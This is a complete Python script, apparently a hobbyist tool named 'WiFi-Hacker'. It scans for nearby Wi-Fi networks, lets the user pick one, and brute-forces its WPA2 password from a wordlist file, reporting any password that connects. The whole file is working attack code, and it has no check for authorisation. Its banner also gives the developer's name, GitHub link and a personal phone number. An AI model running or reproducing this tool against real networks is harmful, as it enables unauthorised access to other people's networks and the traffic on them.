import pywifi
from pywifi import PyWiFi, const, Profile
#from scapy.all import *
import time
import os
import colorama

colorama.init()
GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET
YELLOW = colorama.Fore.YELLOW
BLUE = colorama.Fore.BLUE
lb = colorama.Fore.LIGHTBLUE_EX
lr = colorama.Fore.LIGHTRED_EX
RED = colorama.Fore.RED

wifi = PyWiFi()
iface = wifi.interfaces()[0]

def scan_wifi_networks():
    iface.scan()
    time.sleep(2)  # Wait for the scan to complete
    scan_results = iface.scan_results()
    return scan_results

def bruteforce_wifi(ssid):
    with open("passwords.txt", "r") as file:
        passwords= file.readlines()

    for password in passwords:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(2)
        if iface.status() == const.IFACE_CONNECTED:
            print(f"{GREEN}[✓] SUCCESSFULLY CONNECTED TO {ssid.upper()} WITH PASSWORD: {password}{RESET}")
            break
        else:
            print(f"{RED}[x] Failed to connect with password: {password}{RESET}")

        iface.disconnect()
        time.sleep(2)

def program_intro():
    print("""
    
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    """)
    print(f"\n{GREEN}Tests 2000+ commonly used passwords on a secured wifi network{RESET}")
    print(f"\n{lb}{'******' * 10}")
    print(f"""
    [+] Tool name: WiFi-Hacker
    [+] Developed by: Solomon Adenuga
    [+] Version: 1.0
    [+] Github: https://github.com/SoloTech01
    [+] Whatsapp: +2348023710562
    """)
    print(f"{'******' * 10}{RESET}")
    print(f"\n{RED}MAKE SURE WIFI IS TURNED ON BEFORE STARTING....{RESET}")
    time.sleep(3)
    print(f"\n{GREEN}Scanning for available networks near you.....{RESET}")
    scan_results = scan_wifi_networks()
    time.sleep(2)
    network_list = []
    for network in scan_results:
        time.sleep(1)
        network_list.append(network)
        print(f"\n{YELLOW}[+] NETWORK: {network.ssid}   SIGNAL:{network.signal}{RESET}")
    if len(network_list) > 0:
        ssid = input(f'\n{BLUE}Enter WIFI network name:{RESET} ')
        bruteforce_wifi(ssid)
    else:
        print(f"{RED}NO WIFI NETWORKS FOUND{RESET}")
        pass

program_intro()